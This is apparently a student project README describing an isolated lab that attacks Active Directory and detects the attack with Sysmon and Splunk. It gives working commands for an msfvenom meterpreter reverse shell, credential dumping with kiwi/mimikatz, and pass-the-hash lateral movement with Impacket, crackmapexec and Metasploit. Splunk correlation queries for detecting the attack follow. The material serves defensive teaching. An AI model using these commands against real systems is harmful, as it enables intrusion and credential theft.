# 🛡️ SPR888 Final Project

A full lab simulation of an end-to-end Active Directory attack lifecycle with detection capabilities using Splunk and Sysmon. This setup is ideal for blue teamers, SOC analysts, red teamers, or cybersecurity students looking to understand post-exploitation behavior and threat detection correlation.

- Research Paper: Detection of Active Directory Attacks Using Log Correlation Techniques with Splunk SIEM
- Group Members: Sufian Adnan, Shivkumar Patel, Sagarkumar Patel, Karan Brara
- Video Demonstration [Click Here to View on YouTube](https://youtu.be/gBjenYKNg6k)
---

## 🔍 Overview

This lab demonstrates:

- **Privilege Escalation**
- **Credential Dumping (NTLM Hash Extraction)**
- **Lateral Movement (Impacket & Metasploit)**
- **Log Forwarding via Sysmon & Splunk Universal Forwarder**
- **Detection via Correlation Rules in Splunk**

---

## 🖥️ Lab Environment

| Role               | OS                  | IP Address    |
|--------------------|---------------------|---------------|
| Attacker           | Kali Linux          | 192.168.1.4   |
| Domain Controller  | Windows Server 2016 | 192.168.1.1   |
| Workstation        | Windows 10          | 192.168.1.2   |
| SIEM               | Ubuntu 22.04 (Splunk)| 192.168.1.3   |

> **Networking Mode**: Host-only / Internal for isolated lab.

> **Additional Network**: Needed to for Initial setup of Tools and Exploits

---

## ⚙️ Installation & Setup

### 🔸 Kali Linux (192.168.1.4)

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install metasploit-framework crackmapexec python3-impacket -y
cd /usr/share/doc/python3-impacket/examples/
```

### 🔸 Domain Controller – Windows Server 2016 (192.168.1.1)

- Install **Active Directory Domain Services (AD DS)**
- Promote as Domain Controller: `test.local`
- Create:
  - `Administrator` (Domain Admin)
  - Standard domain user(s)
- Enable:
  - **SMB**
  - **Remote Management**

### 🔸 Windows 10 Client (192.168.1.2)

#### 🔹 Install Sysmon:

1. Download Sysmon from Microsoft Sysinternals.
2. Save `sysmonconfig_custom_expanded.xml` to `C:\Tools\`.
3. Run:
   ```bash
   Sysmon64.exe -accepteula -i C:\Tools\sysmonconfig_custom_expanded.xml
   ```

#### 🔹 Install Splunk Universal Forwarder:

```bash
msiexec /i splunkforwarder.msi AGREETOLICENSE=Yes SPLUNKUSERNAME=admin SPLUNKPASSWORD=Password123! RECEIVING_INDEXER=192.168.1.3:9997 /quiet
"C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe" add monitor "Microsoft-Windows-Sysmon/Operational" -index main -sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
```

### 🔸 Splunk SIEM (192.168.1.3)

```bash
wget -O splunk.tgz 'https://download.splunk.com/products/splunk/releases/latest/linux/splunk.tgz'
tar -xvf splunk.tgz
sudo mv splunk /opt/splunk
sudo /opt/splunk/bin/splunk start --accept-license
sudo /opt/splunk/bin/splunk enable listen 9997 -auth admin:Password123!
```
---

## 🔍 Sysmon Config Enhancements

> 📎 The `sysmonconfig_custom_expanded.xml` configuration file is attached in this repository.
> 📎 All Splunk detection queries are also included as `.spl` or `.txt` files in the repo for easy import or review.

Custom Sysmon config includes rules for:

- **PowerShell execution logging**
- **LOLBAS detection** (`wmic.exe`, `regsvr32.exe`, `psexec.exe`)
- **Suspicious ports** (e.g. 4444, 3389, 445)
- **Executable/DLL drops on SMB shares**
- **Service creation (Event ID 7045)**
- **Multi-stage correlation support**

---

## ⚔️ Attack Simulation

### Step 1 – Generate Payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=5555 -f exe > shell64.exe
python3 -m http.server 1234
```

### Step 2 – Transfer and Execute Payload

On Windows 10 client:  
Visit `http://192.168.1.4:1234` and run `shell64.exe`.

### Step 3 – Metasploit Handler

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.4
set LPORT 5555
run
```

### Step 4 – Post-Exploitation

```bash
getuid
sysinfo
load kiwi
kiwi_cmd sekurlsa::logonpasswords
```

If failed, try:

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
getsystem
kiwi_cmd sekurlsa::logonpasswords
```

Save NTLM hash for Admin account.

---

## 🚪 Lateral Movement (Using Hash)

```bash
cd /usr/share/doc/python3-impacket/examples/
python3 psexec.py -hashes :d2eafa9129913be5081371eb305a5fc3 test.local/Administrator@192.168.1.1
python3 wmiexec.py -hashes :d2eafa9129913be5081371eb305a5fc3 test.local/Administrator@192.168.1.1
python3 smbexec.py -hashes :d2eafa9129913be5081371eb305a5fc3 test.local/Administrator@192.168.1.1

crackmapexec smb 192.168.1.1 -u Administrator -H d2eafa9129913be5081371eb305a5fc3 -x "whoami"
```

Or via Metasploit:

```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.1
set SMBUser Administrator
set SMBPass :d2eafa9129913be5081371eb305a5fc3
set LHOST 192.168.1.4
run
```

---

## 🧠 Detection in Splunk

### 🔹 Possible Impacket Detection

```spl
index=* EventCode=1 
| eval parent=coalesce(ParentImage, "none"), exe=coalesce(Image, "none")
| where like(CommandLine, "%-ForceV1%") 
    AND like(exe, "%\\conhost.exe")
    AND (
        like(parent, "%\\cmd.exe") OR 
        like(parent, "%\\psexesvc.exe") OR 
        like(parent, "%\\wmiexec.py") OR
        like(parent, "%\\smbexec.py") OR 
        like(parent, "%\\impacket%") OR 
        match(ParentCommandLine, ".*cmd.*") OR 
        match(ParentCommandLine, ".*\\\\127\\.0\\.0\\.1\\\\.*")
    )
| eval action="possible_psexec_like_behavior"
| table _time, host, action, exe, CommandLine, parent, ParentCommandLine, User, ParentUser, process_id, ParentProcessId
| sort -_time
 
```

### 🔹 Executable Written to ADMIN Share

```spl
index=* EventCode=5145 Object_Type=File 
| eval share_lc=lower(Share_Name), file_lc=lower(Relative_Target_Name)
| where (like(share_lc, "\\\\%\\admin$") OR like(share_lc, "\\\\%\\ipc$") OR like(share_lc, "\\\\%\\c$"))
| where (like(file_lc, "%.exe") OR like(file_lc, "%.dll"))
| where Access_Mask="0x2"
| eval action="smb_file_write"
| stats 
    count by _time, host, Account_Name, Source_Address, Relative_Target_Name, Share_Name, Access_Mask, action
```

### 🔹 Correlation (5145 + 7045)

```spl
index=* EventCode=5145 Object_Type=File 
  | eval exe_name=lower(Relative_Target_Name)
  | eval log_type="5145"
  | table _time, host, exe_name, Relative_Target_Name, Share_Name, Source_Address, Account_Name, log_type
| append [
  search index=* EventCode=7045 
  | rex field=Message "Service File Name:\s+(?<exe_full>.+\.exe)"
  | eval exe_name=lower(replace(exe_full, ".*\\\\", ""))
  | eval log_type="7045"
  | table _time, host, exe_name, exe_full, Message, User, log_type
]
| stats 
    values(_time) as Timestamps,
    values(Relative_Target_Name) as WrittenExe,
    values(Share_Name) as ShareNames,
    values(Source_Address) as SourceAddresses,
    values(Account_Name) as DroppingAccounts,
    values(User) as ServiceInstallers,
    values(exe_full) as InstalledExe,
    values(Message) as InstallMessages,
    dc(log_type) as Stages
    by exe_name, host
| eval is_suspicious=case(
    Stages=2, "YES",
    match(exe_name, "^[a-z0-9]{6,12}\.exe$"), "LIKELY",
    like(exe_name, "%remcom%") OR like(exe_name, "%psexec%") OR like(exe_name, "%wmiexec%") OR like(exe_name, "%atexec%"), "YES",
    1=1, "NO"
)
| table exe_name, host, is_suspicious, Stages, Timestamps, WrittenExe, InstalledExe, DroppingAccounts, ServiceInstallers, SourceAddresses, ShareNames, InstallMessages
```

### 🔹 Multi-Stage Detection Query

> Full correlation query to track .exe write → service install → process execution.

```spl
index=* EventCode=5145 Object_Type=File 
| eval exe_name=lower(Relative_Target_Name)
| where like(exe_name, "%.exe") AND (
    like(Share_Name, "\\\\%\\ADMIN$") OR 
    like(Share_Name, "\\\\%\\C$") OR 
    like(Share_Name, "\\\\%\\IPC$")
  )
| eval log_type="5145"
| table _time, host, exe_name, Share_Name, Source_Address, Account_Name, log_type
| append [
  search index=* EventCode=7045 
  | rex field=Message "Service File Name:\s+(?<exe_full>.+\.exe)"
  | eval exe_name=lower(replace(exe_full, ".*\\\\", ""))
  | eval log_type="7045"
  | table _time, host, exe_name, exe_full, Message, User, log_type
]
| append [
  search index=* EventCode=1 
  | where like(CommandLine, "%-ForceV1%") AND like(Image, "%conhost.exe")
  | rex field=ParentCommandLine "(?<exe_name>[a-zA-Z0-9_-]{6,15}\.exe)"
  | eval exe_name=lower(exe_name)
  | eval parent=coalesce(ParentImage, ""), log_type="proc"
  | table _time, host, exe_name, CommandLine, parent, ParentCommandLine, User, ParentUser, log_type
]
| stats 
    values(_time) as Timestamps,
    values(Share_Name) as ShareNames,
    values(Source_Address) as SourceAddresses,
    values(Account_Name) as FileDroppers,
    values(User) as ServiceInstallers,
    values(exe_full) as ServicePaths,
    values(Message) as ServiceMessages,
    values(CommandLine) as ProcCmds,
    values(parent) as Parents,
    values(ParentCommandLine) as ParentCmds,
    values(ParentUser) as ParentUsers,
    dc(log_type) as StageCount
    by exe_name, host
| eval is_suspicious=case(
    StageCount >= 3, "YES",
    StageCount = 2, "LIKELY",
    like(exe_name, "%psexec%") OR like(exe_name, "%wmiexec%") OR like(exe_name, "%smbexec%") OR like(exe_name, "%remcom%"), "YES",
    1=1, "NO"
)
| table exe_name, host, is_suspicious, StageCount, Timestamps, ShareNames, SourceAddresses, FileDroppers, ServiceInstallers, ServicePaths, ServiceMessages, ProcCmds, Parents, ParentCmds, ParentUsers
```
---

## ✉️ Splunk Email Alert Configuration

1. Go to **Settings → Searches, Reports, and Alerts**
2. Choose correlation search → **Save As → Alert**
3. Type: `Scheduled` or `Real-time`
4. Trigger Condition: `if number of results > 0`
5. Trigger Action: `Send Email`
6. Configure SMTP under **Settings → Server Settings → Email Settings**
7. Save and test via simulation

---

## 📬 Contact

- **Splunk Queries & Setup Assistance**: [sufianmadnan@icloud.com](mailto:sufianmadnan@icloud.com)  
- **Attack Simulation & Red Team Portion**: [shiv1303patel@gmail.com](mailto:shiv1303patel@gmail.com)
